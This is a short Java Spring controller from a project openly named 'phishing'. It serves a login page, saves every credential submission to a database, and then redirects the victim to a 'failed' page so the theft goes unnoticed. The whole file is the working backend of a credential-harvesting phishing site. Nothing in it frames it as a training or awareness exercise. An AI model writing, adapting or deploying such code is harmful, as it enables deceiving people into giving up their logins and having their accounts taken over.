package br.com.phishing.phishing.resource;

import br.com.phishing.phishing.model.User;
import br.com.phishing.phishing.repository.UserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.Errors;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.bind.support.SessionStatus;

import javax.validation.Valid;

@Controller
@RequestMapping("/")
@SessionAttributes("user")
public class LoginResource {

    @Autowired
    private UserRepository userRepository;

    @GetMapping
    public String getCredentials(Model model) {
        return "index";
    }

    @PostMapping
    public String insert(@Valid User user, Errors errors, SessionStatus sessionStatus) {
        if (errors.hasErrors()) {
            return "user-error";
        }

        userRepository.save(user);

        return "redirect:/failed";
    }

    @ModelAttribute
    public User user() {
        return new User();
    }
}
